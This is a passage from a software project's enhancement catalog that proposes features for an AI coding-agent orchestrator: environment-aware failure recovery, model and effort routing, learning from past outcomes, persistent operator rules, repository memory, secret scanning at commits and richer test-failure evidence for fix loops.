# Enhancement catalog — all 57 initiatives

Status: proposed · Written 2026-09-27 against `c74a9ec` · Companion to [PLAN.md](PLAN.md), which ranks these and explains the tiers.

Every entry was checked against the code at `c74a9ec`: the gap is real (not already built), the files it names exist, and it keeps the repository's rules (subscription-only, the orchestrator as the single source of state, the tool door, security guards, append-only migrations, design.md). **Verified gap** quotes that check. **First steps** are PR-sized. **Check before building** lists what still has to be confirmed against real third-party tools.

Codes: DEC decisions and routing · MEM memory and knowledge · VER verification · SEC security · REL reliability and throughput · OPS operations · AGT agent providers and capacity · DLV delivery and release · INT intake and integrations · NTF notifications and remote control · UX operator experience.

## DEC — Smarter decisions and routing

### DEC-1 · Environment-aware recovery: stop fixing code when the environment is broken

**Now** · Effort L · Impact 4/5 · Needs: nothing first

When tests fail because a database is not running, the disk is full or a setting is missing, the Control Center recognises it. It stops sending the agents round the fix loop and instead blocks once with a plain message naming what to start or set. It also stops mislabelling such outages as 'failures that already existed before this task'. Later phases let the Chairman look at the live environment (who holds a port, process logs) before choosing a strategy, and treat the same outage hitting several tasks as one incident with one alert.

**Verified gap:**

- Tests failures are always CODE_OR_TEST: chairman/signatures.ts:109-111. onFailure (chairman.ts:266-292) builds the signature from message and detail only.
- Partly built, which the initiative misses: packages/tools/src/recovery.ts:8-21 and :53-72 already classify environment failures (missing_dependency, missing_command, port_conflict, transient_network, file_lock, missing_browser, auth_failure).
  - runners.ts:803-819 uses that classification to auto-repair test commands (through tooling.ts:279-292) and records rows in recovery_attempts.

**First steps**

1. Extend packages/tools/src/recovery.ts RULES with conservative service_unavailable (ECONNREFUSED host:port), disk_full (ENOSPC) and missing_env categories, and export isEnvironmentCategory. Add unit tests, including a negative case where a test assertion merely mentions ECONNREFUSED alongside other failing ids.
2. In apps/orchestrator/src/engine/runners.ts (test path ~:803-890), persist the final environment cause on the test_runs row (append-only migration adding env_cause). Skip the 'preexisting' baseline verdict when every failing run has an environment cause, and do not cache baseline records whose own output classifies as environment (engine/baseline-checks.ts).
3. In chairman/signatures.ts categoryOf, map an env_cause to ENVIRONMENT. In chairman/policy.ts decideOnFailure, add an environment_failure trigger with ORDER ['retry_stage'], blocked by commandRetryIsNoop, otherwise MARK_HARD_BLOCKER naming the cause. Add an environment_failure kind to LEARNING_SIGNAL_KINDS and learning/signals.ts.

**Done when:**

- A tests stage whose every failure is 'ECONNREFUSED 127.0.0.1:5432' ends in a hard blocker saying the tests need a service on :5432, after at most one retry and with zero fixer runs. It is not reported as pre-existing, and no baseline record is cached for it.
- A failure where only some ids mention ECONNREFUSED still enters the normal fix loop.
- Phase 2: two supervised tasks in one repository hitting the same specific signature within the window open one incident, are paused together through the gateway, and resume together.

**Check before building:**

- Confirm network.port_owner works unelevated on Windows 11 for ports owned by services or other users; it may return no PID, and the orchestrator must never elevate.
- Confirm error text formats for common service clients (pg, redis, prisma: 'ECONNREFUSED 127.0.0.1:5432', 'Can't reach database server').

### DEC-2 · Chairman 'try harder' recovery step

**Now** · Effort M · Impact 3/5 · Needs: nothing first

When a fix loop stalls, the Chairman can re-investigate, re-plan, switch agents, roll back or retry, but never ask the same agent to think harder. With a single working agent, 'switch agent' has nothing to offer. This adds a recovery step between root-cause analysis and re-planning that raises the stage's effort, or at the top effort moves to the next larger model, for this task only. It is tried once per failure, skipped when usage is tight, and scored like any other strategy, so the system learns whether it helps.

**Verified gap:** Gap confirmed. CHAIRMAN_STRATEGY_KINDS = ['rca','replan','change_agent','rollback','retry_stage'] (packages/shared/src/chairman.ts:184). ORDER (apps/orchestrator/src/chairman/policy.ts:117-130) never includes a model or effort rung. recoveryCandidates only emits CHANGE_AGENT/RETURN_TO_STAGE/REPLAN/ROLLBACK/RETRY (policy.ts:136-213). change_agent needs an untried alternative agent (policy.ts:167-168), and the candidate list drops agents with a capacityBlock (chairman.ts:354-357).

**First steps**

1. Add 'boost' to CHAIRMAN_STRATEGY_KINDS and STRATEGY_KIND_LABEL (packages/shared/src/chairman.ts:184, :325). In apps/orchestrator/src/chairman/policy.ts, insert 'boost' after 'rca' in ORDER for repeated_failure, strategy_exhausted, verify_repeat and review_incomplete. Add a case that emits CHANGE_EFFORT (or CHANGE_MODEL at the top effort) plus RETURN_TO_STAGE, with the rung in the fingerprint.
2. In chairman.ts candidateContext (:350), compute each agent stage's next rung from the models table (efforts, default_effort, model order) and suppress it on capacityBlock or a critical/exceeded budget. Cover it with unit tests in apps/orchestrator/test/chairman-units.test.ts: offered with one agent, not repeated for the same signature, skipped under capacity block, never lowers effort.
3. Raise listStrategyRuns(taskId, 1) to 3 in snapshot.ts:99 and evidence.ts:328 so the reasoner sees which rungs were already tried.

**Done when:** On an install with only Claude enabled, a task whose fix loop stalls on the same failure gets a Chairman decision such as 'Raise Fix effort to high' before any re-plan. The next Fix run's ASSIGNMENT_CHANGED event and argv show the higher effort. The same rung is not offered again for that failure signature. The rung is absent while the agent shows a capacity block. The strategy's outcome (improved or no improvement) is recorded like other strategies.

**Check before building:** 1. Which effort values each Claude model actually accepts (xhigh/max may be model-specific), and what 'default' maps to per model. Read them from listModels rather than assuming. 2. Whether the operator's plan offers the larger model (for example Opus) in Claude Code at all. 3. How much faster higher effort drains the 5-hour and weekly windows. 4. Codex reasoning-effort names, for parity later.

### DEC-3 · Routing advisor: recommend agent, model and effort per role from past stage outcomes

**Next** · Effort L · Impact 4/5 · Needs: nothing first

The Control Center learns which agent, model and effort level actually produces passing stages for each role in each repository and workflow, and shows that as ranked recommendations with sample sizes. The operator applies one with a click. Nothing switches on its own until the recommendations have been checked. It also stops invalid effort levels reaching the CLIs by clamping effort to what the model supports at launch. This turns the usage data already collected into better and cheaper defaults, which the plans name as the next step.

**Verified gap:** Role defaults are static: apps/orchestrator/src/services/settings.ts:6-16. Every adaptive team unit gets the stage assignment: stage-team.ts:221-222 (`const base = this.assignment(task, def, stage)` spread into every unit). packages/shared/src/stage-teams.ts:39-40 says specialty 'never chooses an agent today'. policy.ts:166-171: change_agent takes the first untried agent in registry order (`ctx.availableAgents.find(...)`). gateway.ts:308-316 CHANGE_AGENT passes no model, and carries effort only when every model of the new agent lists it (gateway.ts:118-125).

**First steps**

1. Effort clamp: in apps/orchestrator/src/engine/runners.ts launchAgent (~:538-570), clamp opts.effort to store.listModels(agentId) efforts (nearest supported, else 'default') and record `effortClampedFrom` in the AGENT_STARTED event data. Add a unit test for 'max' on a Codex role.
2. New pure apps/orchestrator/src/usage/routing.ts. It computes cells from task_stages ⋈ tasks ⋈ usage_events(run_id): stage success (verdict PASS or SUCCESS with no fix cycle caused), REVIEW_INCOMPLETE/missing VERDICT, USAGE_LIMIT/MODEL_UNAVAILABLE hits, median known cost and latency. Each cell has min-n, a Wilson lower bound and evidence stage ids. Serve it at GET /api/usage/recommendations in http/usage-routes.ts, with vitest on seeded rows.
3. Recommendations panel on apps/dashboard/src/pages/usage (packages/ui components, semantic tokens) with an 'Apply to role default' button that uses the existing settings PATCH, plus a 'Recommended' badge in AgentsPage and NewTaskPage.

**Done when:**

- GET /api/usage/recommendations returns, per repository × workflow × role, ranked agent/model/effort cells with n, the success lower bound, median cost and latency, and evidence stage ids. Cells below the minimum n are marked 'insufficient'.
- No assignment changes unless the operator clicks Apply, and that change is recorded as a settings event.
- A stage whose resolved effort is not listed for its model starts with a supported effort, and its AGENT_STARTED event names the clamp.
- Routing mode is off by default. suggest/auto are not enabled until evaluation shows the ranking helps.

**Check before building:**

- Confirm the accepted values for Claude Code `--effort` and Codex `-c model_reasoning_effort` per model, and that Codex `supported_reasoning_levels` is reliable across CLI versions.
- Model availability differs by plan (Claude Pro vs Max, ChatGPT Plus vs Pro).
- Codex attempts have unknown cost in the ledger (docs/plans/usage-costs.md:45), so cost ranking must label or exclude unknown costs.

### DEC-4 · Learn from what happened after completion, and from past recoveries

**Next** · Effort L · Impact 4/5 · Needs: nothing first

The Chairman starts using its own history. For each failure type it sees how often each recovery strategy (re-plan, root-cause analysis, hand to another agent…) actually worked in this repository, first as information in its prompt and on the Learning page, later as a cautious re-ordering. Separately, the Control Center checks after a task finishes whether its commits reached the default branch or were reverted. That gives a real-world success label, not just 'the reviewer said PASS'. Both signals then feed routing and the learning loop.

**Verified gap:**

- Recovery ranking is task-local: rankCandidates (chairman/policy.ts:279-289) only demotes families from ChairmanStore.failedStrategyFamilies (store.ts:416-420, `WHERE task_id = ?`), called at chairman.ts:461-463. ORDER is static (policy.ts:117-130).
- chairman_strategy_runs (migrations.ts:907-943, migration 8) has kind, target stage/agent, failure_category and a deterministic status. It has no repository_id and only task-scoped indexes (:942-943).
- Nothing traces a task after COMPLETED: no 'patch-id', 'This reverts commit', task_outcomes or escaped_defect anywhere (grep).

**First steps**

1. ChairmanStore.strategyPriors({repositoryId, workflowId, trigger, failureCategory}) in apps/orchestrator/src/chairman/store.ts, joining tasks. SUCCEEDED+IMPROVED count as success, FAILED+REGRESSED as failure, INCONCLUSIVE/SUPERSEDED are ignored, with a Wilson lower bound. Add an append-only migration for the index on chairman_strategy_runs(failure_category, strategy_kind, status). Unit tests.
2. Add a 'HISTORY (OBSERVED)' line per candidate to chairman/reasoner.ts recoveryPrompt, using trusted counts only. Add GET /api/learning/chairman-performance in http/learning-routes.ts and a strategy table on apps/dashboard/src/pages/learning/LearningPage.tsx (packages/ui).
3. apps/orchestrator/src/services/outcome-tracer.ts labels only 'landed' (isAncestor or combined patch-id reachable from the default branch) and 'reverted' (revert message or inverse patch-id) for tasks completed in the last N days. Store labels in an append-only task_outcomes table, run after RepositoryAutomation.run, and show an 'After completion' line on apps/dashboard/src/pages/task/OverviewTab.tsx. Defer 'refixed' line-range tracking.

**Done when:**

- For a failure category with at least n past strategy runs in the repository, the recovery prompt shows observed success counts per candidate, and Learning shows a per-strategy table with n.
- rankCandidates output is unchanged until phase-2 thresholds are configured.
- Within one automation cycle after a completed task's commits reach the default branch (including via squash), or are reverted there, the task page shows 'landed' or 'reverted' with the commit.
- No label ever changes a task's status.

**Check before building:**

- Confirm `git patch-id --stable` behaviour on Git for Windows.
- A squash merge (GitHub/GitLab PR) changes the sha. A multi-commit task squashed into one commit matches only a patch-id of the task's combined diff (baseline..last commit), not per-commit patch-ids.
- Reverts are detected by the standard 'This reverts commit &lt;sha>.' message (git revert and GitHub's Revert button). Hand-written reverts need inverse-patch-id matching.

### DEC-5 · Evaluation and replay: measure whether prompt, routing and Chairman changes help

**Later** · Effort XL · Impact 4/5 · Needs: VER-3

Today nobody can tell whether a new prompt, a routing change or a Chairman tweak made results better or worse. Real incidents are replayed by hand. This adds, in order:
- a scorecard of outcomes per prompt version;
- a committed set of Chairman decision scenarios that runs in the test suite (and optionally against the real subscription CLI);
- an opt-in recorder of each agent step's files, so a finished task can be replayed through a new build without spending subscription quota.
It is the safety net that lets later 'smarter' features (routing, priors, learning) prove they help before they are switched on.

**Verified gap:**

- No replay or eval code: grep for cassette/ReplayAgent/eval-pipeline/execution_recordings is empty, and package.json:11-34 has no replay/eval scripts.
- Regression scenarios are synthetic [sim:*] markers only (packages/agent-sdk/src/simulated.ts:26-45). Real incidents were replayed by hand (engine/baseline-checks.ts:100 cites the TASK-0010 replay).
- tasks.prompt_versions is written (runners.ts:414, stage-team.ts:288) but never analysed.
- PromptService re-seeds built-ins only while unedited (services/prompts.ts:38-45).

**First steps**

1. Prompt-version scorecard: a read-only query in a new apps/orchestrator/src/services/prompt-scorecard.ts, grouping tasks.prompt_versions[role] with stage verdicts, REVIEW_INCOMPLETE and fix cycles. Add a GET route in apps/orchestrator/src/http/routes.ts, a table in apps/dashboard/src/pages/SettingsPage.tsx prompts, and a 'newer built-in available' hint when prompts/&lt;role>.md differs from the latest built-in version.
2. Chairman decision eval: scenario fixtures in apps/orchestrator/test/fixtures/chairman-scenarios/*.json (snapshot, evidence, candidates, acceptable ids, forbidden guidance, injection cases). A vitest suite covers the deterministic parts (recoveryPrompt fencing, parseRecoveryChoice validation). scripts/eval-chairman.ts runs the same scenarios against the configured subscription CLI only with --live.
3. Opt-in recorder: an execution.recordExecutions setting. After each agent execution in apps/orchestrator/src/engine/runners.ts, write a createCheckpoint ref refs/acc/recordings/&lt;task>/&lt;n> and an append-only execution_recordings row, with retention pruning. The ReplayAgentAdapter and `pnpm replay` follow.

**Done when:**

- Settings → Prompts shows, per template version, the number of tasks, the review-fail-after rate and mean fix cycles, and flags a newer built-in.
- `pnpm test` runs the Chairman scenarios deterministically. `pnpm eval:chairman --live` reports the acceptable-choice rate per scenario and exits without running when no subscription agent is healthy.
- With recording on, each agent execution of a finished task has one recording ref.
- `pnpm replay TASK-x` reproduces the task's stage/verdict/fix-cycle trace on the recorded trees under a simulated adapter, without launching a real CLI.

**Check before building:**

- Claude Code and Codex CLIs expose no seed or temperature control, so live runs are non-deterministic. Paired runs, n and sign tests are required, and deterministic replay is possible only with recorded outputs.
- Live suites consume the 5-hour/weekly subscription windows; confirm the plan limits.
- git object growth from recording refs needs pruning.

### DEC-6 · New Task advisor: overlap warnings, task features and a history-based workflow suggestion

**Later** · Effort M · Impact 3/5 · Needs: nothing first

When the operator writes a new task, the Control Center warns if a running, queued or draft task in the same repository already targets the same files. It also records simple features of the request (bug fix or feature, risky areas such as migrations or auth, size). Once enough similar tasks have finished, it suggests the workflow that most often finished READY for them, with expected time and fix-cycle odds and the sample size. The operator stays in control, and analytics elsewhere can compare like with like.

**Verified gap:**

- The workflow default is chosen unaided: apps/dashboard/src/pages/NewTaskPage.tsx:111 (`workflowId ?? repo?.defaultWorkflowId ?? settings.data?.defaultWorkflowId ?? 'normal-development'`).
- Usage taskType is workflow_id (usage/queries.ts:52, :153).
- Nothing triages, forecasts or advises: grep for triage/forecast/similarTasks/'/api/tasks/advice' is empty.
- Overlap is a real risk.

**First steps**

1. Pure apps/orchestrator/src/engine/triage.ts: kind by keyword rules, path tokens (rules.ts pathTokens) matched to tracked files, risk flags from configurable globs, size bucket. Add an append-only task_triage migration, written in createTask (engine.ts:226) and on draft edit, with actuals (finalStatus, fixCycles, lead time) filled at completion. Unit tests.
2. GET /api/tasks/advice?repositoryId=&description= in apps/orchestrator/src/http/routes.ts. It returns overlap warnings (open, draft or queued tasks sharing path tokens or already-changed files) and nearest-neighbour stats (word plus path overlap, top 10) with n, hidden below a minimum.
3. Advice panel on apps/dashboard/src/pages/NewTaskPage.tsx (packages/ui, semantic tokens): the warnings, and 'Suggested: &lt;workflow> (x/y ready, ~m min)' with a Use button that only sets the picker.

**Done when:**

- A description naming a path touched by a running, queued or draft task in the same repository shows a warning that names that task.
- With at least the minimum number of similar finished tasks, the page shows a suggested workflow with n and expected time, and never changes the selection by itself.
- Every new task has a task_triage row, and its actuals are filled on completion.

**Check before building:** None third-party. Keyword classification is English-only and crude, so show the features and let the operator correct them.

### DEC-7 · Goals: turn one big request into linked, ordered tasks

**Later** · Effort XL · Impact 3/5 · Needs: DLV-2

Today a large request either becomes one oversized task or you split and order the tasks by hand. This adds Goals. A read-only planning run proposes up to 12 right-sized tasks with dependencies. You edit and approve the list, and the Control Center creates them as linked drafts. After 'Start goal', each task runs only once the tasks it depends on have completed cleanly, and it starts from their work. A cancelled, failed or 'needs attention' prerequisite holds its dependents with a clear blocker instead of letting them start on missing work. A Goals view shows each task's status, blockers, total cost and lead time.

**Verified gap:** The gap is real. `git grep -i` over the repository finds no epic, goal_id, goalId, parent_task_id, task_dependencies or task-graph. The only `goal` column is task_contracts.goal (apps/orchestrator/src/db/migrations.ts:294). The only dependency column is stage_work_units.dependencies_json (:1267). The latest migration is version 19 (:1253). The tasks table has no parent or follow-up link. schedule() sorts QUEUED tasks by seq alone and gates only on repositoryHolder (apps/orchestrator/src/engine/engine.ts:803-835, 839-848).

**First steps**

1. Migration 20 in apps/orchestrator/src/db/migrations.ts adds goals(id, title, status, base_policy, auto_advance), task_dependencies(task_id, depends_on) and tasks.goal_id. createTaskSchema (packages/shared/src/schemas.ts:302) gains optional goalId and dependsOn, validated acyclic with hasDependencyCycle once it is exported from stage-teams.ts. schedule() (engine.ts:803) leaves a dependent QUEUED with a 'queued' blocker naming its prerequisite until that one is COMPLETED with finalStatus READY. A prerequisite that is CANCELLED, FAILED or COMPLETED NEEDS_USER_ACTION moves the dependent to WAITING_FOR_USER with a hard blocker and a 'Start anyway' override. Engine tests cover gating, overrides and restart.
2. Add an optional base commit to addWorktree (packages/git/src/worktrees.ts:14), createWorktree and addWorkspaceWorktree (tooling.ts:404,422). In ensureBaseline (engine.ts:1098) a stacked dependent's worktree starts at its prerequisite's taskBranch tip, and after_merge waits until isAncestor(prerequisite tip, HEAD) holds. In task-branch mode, check that the working tree is on the prerequisite's branch, reusing the stackedOn detection at engine.ts:1144.
3. Add packages/shared/src/epics.ts: an acc-task-graph Zod schema (at most 12 tasks with key, title, description, repositoryId, workflowId, dependsOn, acceptance; no policy fields) and a fence-parameterised reader next to work-units.ts. Add workflows/epic-planning.yaml (one Level-1 planner stage). Add a GoalService that writes a goal-request artifact, as Staged Review does in source-control/assist.ts:183 and context.ts:355, and reads the plan artifact on TASK_COMPLETED. Add a Goals page in apps/dashboard (packages/ui, semantic tokens) with 'Create drafts' and 'Start goal', a status list and summed usage through a taskIds filter in usage/queries.ts.

**Done when:** The operator enters one goal, and a Level-1 epic-planning task (it does not hold the repository) returns a validated graph. A graph that names an unknown repository or workflow, contains a cycle, exceeds 12 tasks or carries policy fields is refused with a reason. After approval, linked DRAFT tasks exist and only the roots queue on 'Start goal'. A dependent starts only after its prerequisite completes READY. Its baseline commit equals the prerequisite's branch tip (stacked) or contains it (after_merge). A cancelled, failed or needs-attention prerequisite leaves every dependent waiting with a blocker that names it. Goal state and gating survive an orchestrator restart. The Goals page shows each child's status and blocker, summed cost and lead time. `pnpm check` and the Playwright matrix pass in both themes.

**Check before building:** The only third-party dependency is agent behaviour. The Codex and Claude CLI planners must emit a single valid fenced JSON graph of up to 12 tasks reliably enough to use. This is observed for acc-work-units only with normalize() forgiving slugs and checks, so confirm it with a live run on both CLIs before building the UI. Git: `git worktree add -b <branch> <dir> <commit>` accepts any start commit, and `merge-base --is-ancestor` is standard. Both are stable, but they need a check on the Windows Git version shipped with the operator's setup when the base is another worktree's branch, which is checked out elsewhere, hence using its commit rather than its branch name.

## MEM — Repository memory and knowledge

### MEM-1 · Learning that targets the right stage and measures honestly

**Next** · Effort M · Impact 4/5 · Needs: nothing first

Today the Chairman's instructions for one stage (for example 'fix X this way') leak into every later prompt, including the reviewer's. Learned lessons are picked newest-first with no regard to the stage. This change sends guidance only to the stage it was written for; other stages get a one-line note of what the Chairman is checking. It also ranks proven lessons ahead of untested ones and filters them by role. A lesson's trial counts only tasks that actually received it, and recurrence is measured on the same signal. Tests that fail again and again in one repository become learning evidence, so the loop keeps what works, undoes what doesn't, and learns repository-specific lessons.

**Verified gap:**

Guidance: context.ts:415-417 appends session.strategySummary to every prompt whatever def.role is. chairman.ts:92-98 and :431-436 store only strategySummary, with no stage. gateway.ts:225-228 goTo() has stageKey, but setGuidance(taskId, guidance) (gateway.ts:94-95) drops it. docs/systems/chairman.md:103,226 documents that the guidance 'reaches every later prompt'.

Lessons: service.ts:526-548 promptSection ignores _def.

**First steps**

1. Migration: chairman_sessions.guidance_stage_key and guidance_role. Change setGuidance(taskId, guidance, stageKey) in chairman/gateway.ts:94-95,228 and chairman.ts:92-98,431-436. In engine/context.ts:415-417, give full guidance to the matching stage and role, and to other roles a single line built from the latest strategy run's expectedResult. Tests in apps/orchestrator/test/chairman*.test.ts.
2. Migration: learning_improvements.roles and a learning_exposures table. In learning/service.ts promptSection, order active before trial, filter by def.role, rank by rankSkills word overlap with the task, load lessons for every linked repository, and record an exposure for each delivered improvement. advanceTrials counts only exposed tasks. LearningPage shows 'exposed N, recurred M'.
3. Add a recurring_test_failure signal in learning/signals.ts, fed from test_runs.failures across the repository's last N tasks (excluding nonBlockingFailure). Add it to LEARNING_SIGNAL_KINDS, SIGNAL_KIND_LABEL and SIGNAL_LEGEND, with fenced ids and task counts.

**Done when:**

- A test shows that after a Chairman fix-stage strategy, the reviewer and verifier prompts contain only 'The Chairman is checking: …' and not the fix guidance, while the fixer prompt contains the full guidance.
- With more than 10 live lessons, active lessons appear before trials, and a lesson targeted at 'fixer' is absent from the investigator prompt.
- A trial lesson whose stage never ran in a task does not advance.
- The Improvements tab shows exposed and recurred counts.
- A test id failing blockingly in 2 tasks of one repository yields a recurring_test_failure signal and a rules-derived finding, with no model involved.

**Check before building:** None third-party. Test fixtures must change: the simulated reviewer maps every signal to the same finding (docs/systems/learning.md:162-165), so exposure and recurrence tests need distinct simulated findings.

### MEM-2 · House rules: operator constraints that persist across tasks

**Next** · Effort M · Impact 4/5 · Needs: nothing first

Today an operator who says 'never touch migrations' or 'always run e2e before finishing' has to repeat it on every task, and on tasks without the Chairman the rule is not even checked at completion. House rules let the operator save such a constraint for a repository, or for all repositories, from the Answer or directive dialog or from settings. Each new task starts with the rule as a visible, removable directive, and completion checks it whether or not the task is supervised. When the operator gives the same correction on two tasks, the system proposes making it a house rule but never adopts it alone.

**Verified gap:**

Directive scope and rules:
- DIRECTIVE_SCOPES = ['NEXT_RELEVANT_STAGE','CURRENT_TASK'] (packages/shared/src/chairman.ts:49).
- directiveRuleSchema excludes waive_check (:71-76).
- engine.ts:498-530 addDirective is per task and throws on terminal tasks.
- createTask (engine.ts:226) inserts no directives.
- Plan denial turns into a task-scoped 'Plan feedback:' directive (engine.ts:772-774).
- needs_operator makes a one-task decision blocker (engine.ts:1346-1351).
- Chat 'always/remember/next time' becomes CURRENT_TASK or NEXT_RELEVANT_STAGE (chairman/intent.ts:228-234).

**First steps**

1. Migration: a standing_rules table (id, scope repository|global, repository_id, text, kind constraint|requirement|instruction, rule JSON validated by directiveRuleSchema minus routing, provenance, state, created_at) and task_directives.standing_rule_id. A small StandingRulesService. createTask (engine.ts:226) materialises active rules for each task repository via store.insertDirective, with a USER_DIRECTIVE event 'from house rule'. Tests include a multi-repository task.
2. engine.ts:906 unsupervised completion runs a pure protected-paths and required-check check (reusing gate.ts matchesAny and required-check logic) and feeds the result to complete()'s gateLimitations. Tests cover supervised and unsupervised tasks.
3. Directive and Answer dialog (dialogs.tsx): an 'Also apply to future tasks in &lt;repo>' checkbox, shown only when the text derives a rule or is a constraint. A house rules panel on RepositoryDetailPage using packages/ui, with remove and a 'used by N tasks' count. Then the repeat-correction miner as a proposal card.

**Done when:**

- A rule saved from the Answer dialog appears as an active, removable directive on the next task in that repository and not in other repositories.
- An unsupervised task that edits a protected path finishes NEEDS_USER_ACTION with a named limitation, where before this change it finished READY.
- Giving the same derived protect_paths directive in two tasks produces exactly one proposal card, and dismissing it with 'never suggest again' stops it.
- A remote node can add a rule but gets refused when it tries to remove one.
- The Playwright matrix passes in both themes.

### MEM-3 · Repository memory: past tasks, files that change together, known fixes, and a prompt budget

**Next** · Effort XL · Impact 4/5 · Needs: nothing first

Every task starts from zero today. Agents never see what earlier tasks in the same files found, planned or tripped over. They don't know which files usually change together. When a known test breaks again, the fixer doesn't know how it was fixed last time. This change builds a local, searchable memory of finished tasks and a co-change model from git history. Agents get a short 'related earlier work' and 'usually changed together' note, plus a 'seen before' hint for recurring failures, framed as evidence and never as instructions. A total prompt budget names every section it cuts, so prompts stay within the agent's limits.

**Verified gap:**

What does not exist:
- No FTS, co-change, churn, hotspot, failure_resolution, related_history or prompt-budget code exists (grep over apps/ and packages/).
- git log is used only for outgoing patches and files (packages/git/src/source-control.ts:249-264), historyPage (:569-576), commitMeta (:586) and commitsSince (:638-640). outgoingFiles (:261-264) already runs `log --name-only -z --no-renames --format=` and is the template for a bounded nameOnlyLog.

**First steps**

1. PromptBudget in apps/orchestrator/src/engine/context.ts: a configurable total character budget with role-priority clipping (the diff keeps packDiff's budget). clip() names the artifact's on-disk path, and a 'Context coverage' block lists every cut. Unit tests over oversized artifacts.
2. A migration adds an FTS5 table task_history (repository_id, task_id, outcome, paths, title, text), filled in engine.complete (engine.ts:1456) from the investigation, plan, review and final-report artifacts, redacted and bounded. Add a read-only controlcenter.related operation in tools/control-center.ts, and a {{related_history}} placeholder in packages/shared/src/prompts.ts that pushes the top 3 fenced one-liners for investigator, planner and reviewer.
3. Add a bounded nameOnlyLog in packages/git/src/source-control.ts, modelled on outgoingFiles :261-264. A RepoKnowledgeService runs after syncAll when main moved and writes co-change pairs (skipping commits over 30 files and lockfile or generated files via classifyDiffPath) to a table versioned by head. Add a {{change_impact}} placeholder for planner and reviewer. Fix memory follows in a later PR.

**Done when:**

- A prompt built from oversized artifacts stays within the configured budget and lists each clipped section with its path.
- A second task touching the same files as a completed one shows that task's title, outcome and pitfalls, fenced, in the planner prompt, and controlcenter.related returns it.
- In a fixture repository where a.ts and b.ts co-change in 9 of 10 commits, a diff changing only a.ts yields a reviewer note naming b.ts.
- A failing test id fixed in task A shows 'Seen before: TASK-A' to the fixer in task B.
- The migration test proves FTS5 is available.

**Check before building:**

- better-sqlite3 ^13 (apps/orchestrator/package.json:27) must ship SQLite compiled with SQLITE_ENABLE_FTS5. It is believed to be on by default; prove it with a migration test that creates an fts5 table on Windows and Linux builds.
- The total prompt budget should be configurable per agent and model, because the Codex and Claude Code CLIs' context windows and prompt-size handling differ by model and plan. Confirm how each adapter passes the prompt (stdin or file versus argv, given the ~32K Windows command-line limit) before choosing defaults.
- git for Windows supports `log --name-only -z -n` (standard).

## VER — Verification depth

### VER-1 · Secret scan at every task commit, plus a security scanning pack

**Now** · Effort M · Impact 4/5 · Needs: nothing first

Today a credential an agent writes into a file is committed to the task branch unchecked: at the Git checkpoint, at task completion in worktree mode, and through the agent's git.commit tool. It is only caught at push or release, when history already has to be rewritten. This initiative runs the same secret check at each of those commits and sends findings back to the fixer. It also adds read-only security.secret_scan and security.dependency_audit tools (SAST comes later) whose new-versus-baseline findings are shown to reviewers and recorded as optional verification evidence.

**Verified gap:** No security pack exists: builtinProviders() (packages/tools/src/index.ts:50-73) has no security provider, and a search of apps/ and packages/ finds no semgrep, osv, pip-audit or `audit --json`. Secret scanning runs in only three places: the Source Control commit (source-control/service.ts:699-701, preflightFindings), Source Control push (service.ts:924, scanOutgoing) and release push (release/service.ts:297). Four places commit task work with no scan. (1) runGit (engine/runners.ts:1392) calls commitPaths directly.

**First steps**

1. Move preflightFindings, addedLinesByFile and SECRET_LABEL from apps/orchestrator/src/source-control/preflight.ts into packages/security (keep a re-export). Run them on the staged diff of the task's own paths before committing in engine/runners.ts runGit (:1388-1392, a finding returns tests_failed through the onFail branch), engine/tooling.ts finalizeWorktree (:486-488, a finding keeps the files in the worktree-backup ref and raises an event instead of committing) and packages/tools/src/packs/git.ts git.commit (:261). No inline allow marker. Tests use runtime-assembled fake tokens.
2. Add packages/tools/src/packs/security.ts with security.secret_scan (Level 1, writes:false, scope task|staged|paths, using a baseline commit added to the task tool scope in tooling.ts:133) and security.dependency_audit (osv-scanner on lockfiles when installed, else pnpm/npm `audit --json`; advisory ids diffed against the baseline lockfile read with `git show`; 'network' effect). Register it in builtinProviders (packages/tools/src/index.ts:50) and add 'security.*' to CORE in profiles.ts:18.
3. Add a 'security' evidence kind to packages/tools/src/verification.ts EXTRA_EVIDENCE and map it in tooling.ts verificationCoverage (:546-548). Add a security_findings prompt placeholder in engine/context.ts (:376) used by the review and verify templates. Add osv-scanner to INSTALLABLE_TOOLS (packages/shared/src/learning.ts:68). SAST (semgrep) is deferred until an install method for it exists.

**Done when:** In three cases a task whose agent writes a test-assembled GitHub token into a source file ends with no commit containing it. A full-autopilot task's Git checkpoint fails with 'contains what looks like a GitHub token' and the fixer removes the token before the checkpoint passes. A worktree-mode task leaves the file uncommitted, with an event. git.commit returns a failure. For a task that adds a dependency with a known advisory, the review prompt lists that advisory (package, severity, fixed-in version) and does not list advisories already present on the baseline lockfile. Verification coverage shows 'Security scan' when the scan ran. pnpm check passes with new tests for each commit site.

**Check before building:** Confirm the npm registry audit endpoints that pnpm, npm and yarn classic `audit --json` use are still served. npm has been retiring legacy audit endpoints, so older pnpm or yarn v1 may fail. Confirm the osv-scanner v2 CLI shape (`osv-scanner scan source -L <lockfile> --format json`), its offline flags (`--offline-vulns`, `--download-offline-databases`) and the exact winget package id. pip-audit is safe only with `--no-deps --disable-pip` on fully pinned or hashed requirements. cargo audit clones the RustSec advisory database over the network.

### VER-2 · Complete failure and review evidence for the fix loop

**Now** · Effort L · Impact 4/5 · Needs: nothing first

The fixer, implementer and fix decomposer see every blocking failed check, each with its failing test ids and, per failure, the assertion message and the first line of project code involved, instead of the last 80 lines of one command. Reviewers can add a small structured issue list, so blocking issues are tracked by id across fix cycles and the Chairman judges progress by issues resolved rather than by counting bullet points. Team reviewer disagreement is recorded. A per-agent reviewer calibration comes later, once outcome labels exist.

**Verified gap:**

Confirmed:
- context.ts:256-283 lists failing ids only for runs classified preexisting (:264-266), and tails only the first blocking failed run (`failed = latest.find(...)`, :267-270, 80 lines). A second failed command in the same batch contributes only its one-line summary.
- FailureIdCollector (engine/test-summary.ts) captures ids only. It records no messages or frames, and FAILURE_LINE does not match Go `--- FAIL:` or Cargo `test x ... FAILED`.

**First steps**

1. Change context.ts testResults (:256-283) to list the stored test_runs.failures ids (up to 30) for every blocking failed run, not only pre-existing ones. Keep the 80-line tail for the first run and add a short tail for each other blocking failed run. Chairman evidence.testFailure and signatureOf use test_runs.failures instead of re-parsing the tail.
2. Add a FailureDetailCollector beside FailureIdCollector in engine/test-summary.ts. For each failure it records the test id, error class, message (at most 400 characters) and the first in-workdir frame file:line, for Vitest, Jest, pytest and Playwright. It is fed from the same onLine stream in runners.ts executeCommand. Migration 20 adds test_runs.failure_details, stored redacted and capped. Details are rendered in {{test_results}}, with a frame flagged when it is in a changed file.
